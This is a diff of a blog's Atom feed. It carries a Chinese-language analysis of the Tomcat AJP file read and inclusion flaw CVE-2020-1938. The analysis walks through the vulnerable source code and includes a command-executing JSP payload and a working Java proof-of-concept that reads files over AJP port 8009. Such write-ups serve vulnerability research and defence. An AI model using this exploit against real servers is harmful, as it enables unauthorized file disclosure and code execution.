@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://0day.design/"/>
-  <updated>2020-03-02T15:15:21.190Z</updated>
+  <updated>2020-03-02T15:41:31.539Z</updated>
   <id>http://0day.design/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://0day.design/2020/03/02/Tomcat-Ajp%20%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2020-1938)/"/>
     <id>http://0day.design/2020/03/02/Tomcat-Ajp 协议漏洞分析(CVE-2020-1938)/</id>
     <published>2020-03-02T15:14:00.000Z</published>
-    <updated>2020-03-02T15:15:21.190Z</updated>
+    <updated>2020-03-02T15:41:31.539Z</updated>
     
-    <content type="html"><![CDATA[<hr><a id="more"></a><p>Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>该漏洞可以用来读取或包含 Tomcat 上所有 webapp目录下的任意文件，文件包含漏洞影响以下版本：</p><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>测试版本8.5.16，用的mac下Mxsrvs自带的tomcat。<br>在/bin/catalina.sh文件头部里增加一行，设置调试端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export JPDA_ADDRESS=9901</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/02/vkZroWGKeIO184V.jpg" alt="-w783"></p><p>再修改一下startup.sh的最后一行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; start &quot;$@&quot;</span><br><span class="line">exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; jpda start &quot;$@&quot;</span><br></pre></td></tr></table></figure></p><p>Idea里配置一下<br><img src="https://i.loli.net/2020/03/02/xqcu1pitSarPJD7.jpg" alt="-w978"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>EXP： <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><br><img src="https://i.loli.net/2020/03/02/Zg1deLMkRTcxS8m.jpg" alt="-w702"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>本地测试8.5.16版本，tomcat默认开启三个端口：<br><img src="https://i.loli.net/2020/03/02/T9mLHDfPBAUh3av.jpg" alt="-w751"><br>在/conf/server.xml中配置：<br><img src="https://i.loli.net/2020/03/02/O28YPrCHmxqTQNk.jpg" alt="-w774"><br><img src="https://i.loli.net/2020/03/02/q4azdIu6RT58XMH.jpg" alt="-w480"><br><img src="https://i.loli.net/2020/03/02/Gx6rF2UkmiwpneP.jpg" alt="-w805"></p><p>Tomcat服务器通过Connector连接器组件与客户程序建立连接，connector组件负责接收客户的请求，以及把Tomcat服务器的响应结果发送给客户。</p><p>在上图的配置中有两个connect，即8080端口对应着Http Connector，使用http（HTTP/1.1）协议；8009使用的AJP Connector，使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。更详细的介绍可以参考一下AJP协议的官方文档:<a href="http://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">The Apache Tomcat Connectors - AJP Protocol Reference</a></p><p>Web客户访问的两种方式：<br><img src="https://i.loli.net/2020/03/02/whOKXL8gN4GRjbp.jpg" alt=""></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>配置idea的时候先下个源码：<a href="https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar" target="_blank" rel="noopener">https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar</a></p><p>tomcat-coyote.jar!/org/apache/coyote/ajp/AjpProcessor.class#prepareRequest<br><img src="https://i.loli.net/2020/03/02/Q6Beip7bf9v5ngC.jpg" alt="-w1008"><br>在AJP协议的请求结构中有这样一个字段<em>属性</em><code>attributes</code>：<br><img src="https://i.loli.net/2020/03/02/GgFneVsmU8XJAHO.jpg" alt="-w1014"><br>对应上文代码中<code>switch case</code>中的匹配项，跟进<code>Constants.SC_A_REQ_ATTRIBUTE</code>：/org/apache/coyote/ajp/Constants.java<br><img src="https://i.loli.net/2020/03/02/SiXz1xOd68EsNfD.jpg" alt="-w1020"><br>这里定义了所有属性，<code>Constants.SC_A_REQ_ATTRIBUTE</code>这个case在文档中对应<code>req_attribute</code>属性，意思是说，如果要发超出上述基础属性以外的值，都可以通过<code>req_attribute(0X0A)</code>来设置其属性名和值来发送。<br><img src="https://i.loli.net/2020/03/02/avTn3W8NroS56Id.jpg" alt="-w1490"><br>不难理解，也就对应着这里的处理逻辑，如果是在上述之外属性，则允许我们自定义：<br><img src="https://i.loli.net/2020/03/02/RIOvT3hPSF2V4cD.jpg" alt="-w977"></p><p>这里其实就是允许我们设置Request对象的attribute属性。在下文中会提到的几个属性可以被设置：</p><ul><li>javax.servlet.include.request_uri</li><li>javax.servlet.include.path_info</li><li>javax.servlet.include.servlet_path</li></ul><p>封装完request对象后，继续处理Servlet的映射流程<br><img src="https://i.loli.net/2020/03/02/GhHuvb47dz9fcCq.jpg" alt="-w1431"></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>当url请求未在映射的url列表里面则会通过tomcat默认的DefaultServlet会根据上面的三个属性来读取文件，<code>/org/apache/catalina/servlets/DefaultServlet.class</code>：<br><img src="https://i.loli.net/2020/03/02/JxKwrQa6Wp743qy.jpg" alt="-w1459"><br>跟进<code>getRelativePath</code>函数，当<code>request</code>属性中<code>javax.servlet.include.request_uri</code>不为空，则取出另外两个<code>javax.servlet.include.path_info</code>和<code>javax.servlet.include.servlet_path</code>属性，最后加到<code>result</code>里返回：<br><img src="https://i.loli.net/2020/03/02/hRp45k2VFQAunPD.jpg" alt="-w1133"></p><p>然后将结果带入<code>this.resources.getResource</code>函数：<br><img src="https://i.loli.net/2020/03/02/sRJ6VLzEIe5w1bh.jpg" alt="-w1584"><br>然后一直跟进，直到调用<code>this.cache.getResource</code>函数读取资源：<br><img src="https://i.loli.net/2020/03/02/HjaxYmqBo3iRhUZ.jpg" alt="-w1651"></p><p>读取到<code>/WEB-INF/web.xml</code>文件：<br><img src="https://i.loli.net/2020/03/02/biZMujmY3yNX4kL.jpg" alt="-w1139"></p><h3 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h3><p>当url请求映射在<code>org.apache.jasper.servlet.JspServlet</code>这个servlet的时候也可通过上述三个属性来控制访问的jsp文件。<br><img src="https://i.loli.net/2020/03/02/zDC8YK3Qb6ZqrEP.jpg" alt="-w1253"></p><p>随便包含一个上传的文件:<br>upload<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span> contentType=<span class="string">"text/html; charset=ISO-8859-1"</span></span><br><span class="line">    pageEncoding=<span class="string">"ISO-8859-1"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"open -a Calculator"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/02/nXhI6vVD3oZqO5k.jpg" alt="-w1377"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ajp协议的通信客户端demo: <a href="https://github.com/kohsuke/ajp-client" target="_blank" rel="noopener">https://github.com/kohsuke/ajp-client</a></p><p>这里贴一个threedr3am师傅的EXP: <a href="https://github.com/threedr3am/learnjavabug" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug</a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileRead</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    SimpleAjpClient ac = <span class="keyword">new</span> SimpleAjpClient();</span><br><span class="line">    String host = <span class="string">"localhost"</span>;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="number">8009</span>;</span><br><span class="line">    String uri = <span class="string">"/xxxxxxxxxxxxxxxest.xxx"</span>;</span><br><span class="line">    String file = <span class="string">"/index.jsp"</span>;</span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">4</span>) &#123;</span><br><span class="line">      host = args[<span class="number">0</span>];</span><br><span class="line">      port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">      uri = args[<span class="number">2</span>].equalsIgnoreCase(<span class="string">"file"</span>) ? uri : <span class="string">"/xxxxxxxxxxxxxxxest.jsp"</span>;</span><br><span class="line">      file = args[<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    ac.connect(host, port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a message that indicates the beginning of the request</span></span><br><span class="line">    TesterAjpMessage forwardMessage = ac.createForwardMessage(uri);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"1"</span>);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.path_info"</span>, file);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">""</span>);</span><br><span class="line">    forwardMessage.end();</span><br><span class="line">    ac.sendMessage(forwardMessage);</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">byte</span>[] responseBody = ac.readMessage();</span><br><span class="line">      <span class="keyword">if</span> (responseBody == <span class="keyword">null</span> || responseBody.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      System.out.print(<span class="keyword">new</span> String(responseBody));</span><br><span class="line">    &#125;</span><br><span class="line">    ac.disconnect();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>比较简单，没啥好说的，指定路由为jsp的时候走<code>org.apache.jasper.servlet.JspServlet</code>处理，其他则走<code>/org/apache/catalina/servlets/DefaultServlet</code>默认处理。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>洞挺牛逼的，虽然不能直接命令执行，本地的mxsrvs启动tomcat的时候默认启动8009，但是实测了一些真实环境的，独立部署的时候大都没有ajp这个端口，或许在负载均衡反代的场景比较多？</p><p> 参考文章</p><ul><li><a href="https://www.anquanke.com/post/id/199448" target="_blank" rel="noopener">CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析</a></li><li><a href="http://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">The Apache Tomcat Connectors - AJP Protocol Reference</a></li><li><a href="https://juejin.im/post/5cf6366ce51d45105e021275" target="_blank" rel="noopener">如何断点调试Tomcat源码</a></li></ul>]]></content>
+    <content type="html"><![CDATA[<hr><a id="more"></a><p>Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>该漏洞可以用来读取或包含 Tomcat 上所有 webapp目录下的任意文件，文件包含漏洞影响以下版本：</p><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>测试版本8.5.16，用的mac下Mxsrvs自带的tomcat。<br>在/bin/catalina.sh文件头部里增加一行，设置调试端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export JPDA_ADDRESS=9901</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/02/vkZroWGKeIO184V.jpg" alt="-w783"></p><p>再修改一下startup.sh的最后一行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; start &quot;$@&quot;</span><br><span class="line">exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; jpda start &quot;$@&quot;</span><br></pre></td></tr></table></figure></p><p>Idea里配置一下<br><img src="https://i.loli.net/2020/03/02/xqcu1pitSarPJD7.jpg" alt="-w978"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>EXP： <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><br><img src="https://i.loli.net/2020/03/02/Zg1deLMkRTcxS8m.jpg" alt="-w702"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>本地测试8.5.16版本，tomcat默认开启三个端口：<br><img src="https://i.loli.net/2020/03/02/T9mLHDfPBAUh3av.jpg" alt="-w751"><br>在/conf/server.xml中配置：<br><img src="https://i.loli.net/2020/03/02/O28YPrCHmxqTQNk.jpg" alt="-w774"><br><img src="https://i.loli.net/2020/03/02/q4azdIu6RT58XMH.jpg" alt="-w480"><br><img src="https://i.loli.net/2020/03/02/Gx6rF2UkmiwpneP.jpg" alt="-w805"></p><p>Tomcat服务器通过Connector连接器组件与客户程序建立连接，connector组件负责接收客户的请求，以及把Tomcat服务器的响应结果发送给客户。</p><p>在上图的配置中有两个connect，即8080端口对应着Http Connector，使用http（HTTP/1.1）协议；8009使用的AJP Connector，使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。更详细的介绍可以参考一下AJP协议的官方文档:<a href="http://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">The Apache Tomcat Connectors - AJP Protocol Reference</a></p><p>Web客户访问的两种方式：<br><img src="https://i.loli.net/2020/03/02/whOKXL8gN4GRjbp.jpg" alt=""></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>配置idea的时候先下个源码：<a href="https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar" target="_blank" rel="noopener">https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar</a></p><p>tomcat-coyote.jar!/org/apache/coyote/ajp/AjpProcessor.class#prepareRequest<br><img src="https://i.loli.net/2020/03/02/Q6Beip7bf9v5ngC.jpg" alt="-w1008"><br>在AJP协议的请求结构中有这样一个字段<em>属性</em><code>attributes</code>：<br><img src="https://i.loli.net/2020/03/02/GgFneVsmU8XJAHO.jpg" alt="-w1014"><br>对应上文代码中<code>switch case</code>中的匹配项，跟进<code>Constants.SC_A_REQ_ATTRIBUTE</code>：/org/apache/coyote/ajp/Constants.java<br><img src="https://i.loli.net/2020/03/02/SiXz1xOd68EsNfD.jpg" alt="-w1020"><br>这里定义了所有属性，<code>Constants.SC_A_REQ_ATTRIBUTE</code>这个case在文档中对应<code>req_attribute</code>属性，意思是说，如果要发超出上述基础属性以外的值，都可以通过<code>req_attribute(0X0A)</code>来设置其属性名和值来发送。<br><img src="https://i.loli.net/2020/03/02/avTn3W8NroS56Id.jpg" alt="-w1490"><br>不难理解，也就对应着这里的处理逻辑，如果是在上述之外属性，则允许我们自定义：<br><img src="https://i.loli.net/2020/03/02/RIOvT3hPSF2V4cD.jpg" alt="-w977"></p><p>这里其实就是允许我们设置Request对象的attribute属性。在下文中会提到的几个属性可以被设置：</p><ul><li>javax.servlet.include.request_uri</li><li>javax.servlet.include.path_info</li><li>javax.servlet.include.servlet_path</li></ul><p>封装完request对象后，继续处理Servlet的映射流程<br><img src="https://i.loli.net/2020/03/02/GhHuvb47dz9fcCq.jpg" alt="-w1431"></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>当url请求未在映射的url列表里面则会通过tomcat默认的DefaultServlet会根据上面的三个属性来读取文件，<code>/org/apache/catalina/servlets/DefaultServlet.class</code>：<br><img src="https://i.loli.net/2020/03/02/JxKwrQa6Wp743qy.jpg" alt="-w1459"><br>跟进<code>getRelativePath</code>函数，当<code>request</code>属性中<code>javax.servlet.include.request_uri</code>不为空，则取出另外两个<code>javax.servlet.include.path_info</code>和<code>javax.servlet.include.servlet_path</code>属性，最后加到<code>result</code>里返回：<br><img src="https://i.loli.net/2020/03/02/hRp45k2VFQAunPD.jpg" alt="-w1133"></p><p>然后将结果带入<code>this.resources.getResource</code>函数：<br><img src="https://i.loli.net/2020/03/02/sRJ6VLzEIe5w1bh.jpg" alt="-w1584"><br>然后一直跟进，直到调用<code>this.cache.getResource</code>函数读取资源：<br><img src="https://i.loli.net/2020/03/02/HjaxYmqBo3iRhUZ.jpg" alt="-w1651"></p><p>读取到<code>/WEB-INF/web.xml</code>文件：<br><img src="https://i.loli.net/2020/03/02/biZMujmY3yNX4kL.jpg" alt="-w1139"></p><h3 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h3><p>当url请求映射在<code>org.apache.jasper.servlet.JspServlet</code>这个servlet的时候也可通过上述三个属性来控制访问的jsp文件。<br><img src="https://i.loli.net/2020/03/02/zDC8YK3Qb6ZqrEP.jpg" alt="-w1253"></p><p>随便包含一个上传的文件:<br>upload<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span> contentType=<span class="string">"text/html; charset=ISO-8859-1"</span></span><br><span class="line">    pageEncoding=<span class="string">"ISO-8859-1"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"open -a Calculator"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/02/nXhI6vVD3oZqO5k.jpg" alt="-w1377"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ajp协议的通信客户端demo: <a href="https://github.com/kohsuke/ajp-client" target="_blank" rel="noopener">https://github.com/kohsuke/ajp-client</a></p><p>这里贴一个threedr3am师傅的EXP: <a href="https://github.com/threedr3am/learnjavabug" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug</a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileRead</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    SimpleAjpClient ac = <span class="keyword">new</span> SimpleAjpClient();</span><br><span class="line">    String host = <span class="string">"localhost"</span>;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="number">8009</span>;</span><br><span class="line">    String uri = <span class="string">"/xxxxxxxxxxxxxxxest.xxx"</span>;</span><br><span class="line">    String file = <span class="string">"/index.jsp"</span>;</span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">4</span>) &#123;</span><br><span class="line">      host = args[<span class="number">0</span>];</span><br><span class="line">      port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">      uri = args[<span class="number">2</span>].equalsIgnoreCase(<span class="string">"file"</span>) ? uri : <span class="string">"/xxxxxxxxxxxxxxxest.jsp"</span>;</span><br><span class="line">      file = args[<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    ac.connect(host, port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a message that indicates the beginning of the request</span></span><br><span class="line">    TesterAjpMessage forwardMessage = ac.createForwardMessage(uri);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"1"</span>);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.path_info"</span>, file);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">""</span>);</span><br><span class="line">    forwardMessage.end();</span><br><span class="line">    ac.sendMessage(forwardMessage);</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">byte</span>[] responseBody = ac.readMessage();</span><br><span class="line">      <span class="keyword">if</span> (responseBody == <span class="keyword">null</span> || responseBody.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      System.out.print(<span class="keyword">new</span> String(responseBody));</span><br><span class="line">    &#125;</span><br><span class="line">    ac.disconnect();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>比较简单，没啥好说的，指定路由为jsp的时候走<code>org.apache.jasper.servlet.JspServlet</code>处理，其他则走<code>/org/apache/catalina/servlets/DefaultServlet</code>默认处理。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>洞挺牛逼的，虽然不能直接命令执行，本地的mxsrvs启动tomcat的时候默认启动8009，但是实测了一些真实环境的，独立部署的时候大都没有ajp这个端口，或许在负载均衡反代的场景比较多？</p><p> 参考文章</p><ul><li><a href="https://www.anquanke.com/post/id/199448" target="_blank" rel="noopener">CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析</a></li><li><a href="http://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">The Apache Tomcat Connectors - AJP Protocol Reference</a></li><li><a href="https://juejin.im/post/5cf6366ce51d45105e021275" target="_blank" rel="noopener">如何断点调试Tomcat源码</a></li></ul>]]></content>
     
     <summary type="html">
     
@@ -34,9 +34,9 @@
       <category term="Web" scheme="http://0day.design/categories/Web/"/>
     
     
-      <category term="Java" scheme="http://0day.design/tags/Java/"/>
-    
       <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Java" scheme="http://0day.design/tags/Java/"/>
     
   </entry>
   
@@ -82,9 +82,9 @@
       <category term="Web" scheme="http://0day.design/categories/Web/"/>
     
     
-      <category term="Java" scheme="http://0day.design/tags/Java/"/>
-    
       <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Java" scheme="http://0day.design/tags/Java/"/>
     
   </entry>
   
@@ -106,9 +106,9 @@
       <category term="Web" scheme="http://0day.design/categories/Web/"/>
     
     
-      <category term="Java" scheme="http://0day.design/tags/Java/"/>
-    
       <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Java" scheme="http://0day.design/tags/Java/"/>
     
       <category term="weblogic" scheme="http://0day.design/tags/weblogic/"/>
     
@@ -132,9 +132,9 @@
       <category term="Web" scheme="http://0day.design/categories/Web/"/>
     
     
-      <category term="Java" scheme="http://0day.design/tags/Java/"/>
-    
       <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Java" scheme="http://0day.design/tags/Java/"/>
     
   </entry>
   
@@ -156,9 +156,9 @@
       <category term="Web" scheme="http://0day.design/categories/Web/"/>
     
     
-      <category term="Java" scheme="http://0day.design/tags/Java/"/>
-    
       <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Java" scheme="http://0day.design/tags/Java/"/>
     
       <category term="fastjson" scheme="http://0day.design/tags/fastjson/"/>
     
@@ -182,9 +182,9 @@
       <category term="Web" scheme="http://0day.design/categories/Web/"/>
     
     
-      <category term="Java" scheme="http://0day.design/tags/Java/"/>
-    
       <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Java" scheme="http://0day.design/tags/Java/"/>
     
       <category term="fastjson" scheme="http://0day.design/tags/fastjson/"/>
     
@@ -208,9 +208,9 @@
       <category term="Web" scheme="http://0day.design/categories/Web/"/>
     
     
-      <category term="Java" scheme="http://0day.design/tags/Java/"/>
-    
       <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Java" scheme="http://0day.design/tags/Java/"/>
     
   </entry>
   
@@ -232,9 +232,9 @@
       <category term="Web" scheme="http://0day.design/categories/Web/"/>
     
     
-      <category term="Java" scheme="http://0day.design/tags/Java/"/>
-    
       <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Java" scheme="http://0day.design/tags/Java/"/>
     
   </entry>
   
@@ -256,9 +256,9 @@
       <category term="Web" scheme="http://0day.design/categories/Web/"/>
     
     
-      <category term="Java" scheme="http://0day.design/tags/Java/"/>
-    
       <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="Java" scheme="http://0day.design/tags/Java/"/>
     
   </entry>
   
@@ -300,9 +300,9 @@
     </summary>
     
     
-      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="Web" scheme="http://0day.design/tags/Web/"/>
+    
+      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -324,9 +324,9 @@
     </summary>
     
     
-      <category term="Web" scheme="http://0day.design/tags/Web/"/>
-    
       <category term="Code" scheme="http://0day.design/tags/Code/"/>
+    
+      <category term="Web" scheme="http://0day.design/tags/Web/"/>
     
   </entry>
   
